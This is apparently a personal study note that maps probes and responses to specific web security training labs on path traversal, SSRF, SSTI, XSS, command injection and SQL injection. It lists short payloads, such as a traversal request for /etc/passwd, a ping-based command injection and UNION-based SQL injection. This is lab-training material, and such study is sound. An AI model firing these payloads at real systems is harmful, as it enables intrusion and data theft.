#### Check stock ❌
- `GET /image?filename=../../../etc/passwd`
	- 200 OK
		- [[LFI#3.1. Lab File path traversal, simple case ⭕️]]
	- "No such file"
		- [[LFI#3.2. Lab File path traversal, traversal sequences blocked with absolute path bypass ⭕️]]
		- [[LFI#3.3. Lab File path traversal, traversal sequences stripped non-recursively ⭕️]]
		- [[LFI#3.4. Lab File path traversal, traversal sequences stripped with superfluous URL-decode ⭕️]]
		- [[LFI#3.6. Lab File path traversal, validation of file extension with null byte bypass ⭕️]]
	- "Missing parameter 'filename'"
		- [[LFI#3.5. Lab File path traversal, validation of start of path ⭕️]]
- `GET /product?productId=1` set `Referer` to Burp Collaborator
	- [[SSRF#3.3. Lab Blind SSRF with out-of-band detection ⭕️]]
- `GET /?message=Unfortunately...`  after clicking on View details
	- `<%25%3d+7*7+%25>`
		- 49 in response
			- [[SSTI#3.1. Lab Basic server-side template injection ⭕️]]
		- `7*7` in response
			- [[SSTI#3.4. Lab Server-side template injection in an unknown language with a documented exploit ⭕️]]
- `GET /product?productId=a`
	- Apache Struts 2 2.3.31
		- [[Content Discovery#1.1 Lab Information disclosure in error messages ⭕️]]

##### Comment in Page Source
- `phpinfo.php`
	- [[Content Discovery#1.2. Lab Information disclosure on debug page ⭕️]]
- `addEventListener`
	- `JSON.parse(e.data)` 
		- [[DOM-Based XSS#1.3. Lab DOM XSS using web messages and `JSON.parse` ⭕️]]
	- `getElementById()`
		- [[DOM-Based XSS#1.1. Lab DOM XSS using web messages ⭕️]]

##### Target > Engagement tools > Search
- `lastViewedProduct`
	- [[DOM-Based XSS#1.5. Lab DOM-based cookie manipulation ⭕️]]


##### `/robots.txt`
- `/backup`
	- [[Content Discovery#1.3. Lab Source code disclosure via backup files ⭕️]]
	- 

##### Submit Feedback
- `||ping+-c+10+127.0.0.1||` 
	- takes ~10secs from response
		- [[OS Command Injection#3.2. Lab Blind OS command injection with time delays ⭕️]]
		- [[OS Command Injection#3.3. Lab Blind OS command injection with output redirection ⭕️]]
	- immediate response
		- [[OS Command Injection#3.4. Lab Blind OS command injection with out-of-band interaction ⭕️]]
		- [[OS Command Injection#3.5. Lab Blind OS command injection with out-of-band data exfiltration ⭕️]]

##### Filter Categories
- `'+order+by+1--`
	- 200 OK
		- <sup>Solve: '+OR+1=1--</sup> [[SQLi#2.1. Lab SQL injection vulnerability in WHERE clause allowing retrieval of hidden data ⭕️]]
	- 500 Internal Server Error
		- JavaScript syntax error `JSInterpreterFailure`
			- [[NoSQL injection#1/2.1. Lab Detecting NoSQL injection ⭕️]]

##### Filter Categories (No Products) <sup>Only show 2 rows of text per entry</sup>
- `'+order+by+1--`
	- 200 OK
		- `'+UNION+SELECT+'abc','def'+FROM+dual--` == 200 OK
			- [[SQLi#2.3. Lab SQL injection attack, querying the database type and version on Oracle ⭕️]] 
	- 500 Internal Server Error
		- `'+order+by+1#` == 200 OK
			- [[SQLi#2.4. Lab SQL injection attack, querying the database type and version on MySQL and Microsoft ⭕️]]


